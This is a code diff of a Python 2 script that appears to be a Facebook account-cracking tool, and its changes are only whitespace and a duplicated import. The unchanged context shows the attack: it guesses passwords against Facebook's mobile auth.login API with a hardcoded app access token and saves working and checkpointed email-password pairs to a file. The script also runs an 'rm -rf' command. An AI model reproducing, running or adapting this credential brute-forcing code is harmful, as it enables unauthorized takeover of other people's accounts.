@@ -1,6 +1,7 @@
 #!/usr/bin/python2
 #coding=utf-8
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
+import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
 os.system('rm -rf .txt')
 for n in range(5000):
 
@@ -193,7 +194,7 @@ def cemail():
         except OSError:
             pass
         try:
-			pass1 = anggaxd1
+            pass1 = anggaxd1
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + user + c + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
@@ -208,7 +209,6 @@ def cemail():
                 cps.write(k + user + c + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass1 + '\n')
                 cps.close()
                 cpb.append(k + user + c + pass1)
-												
         except:
             pass
             
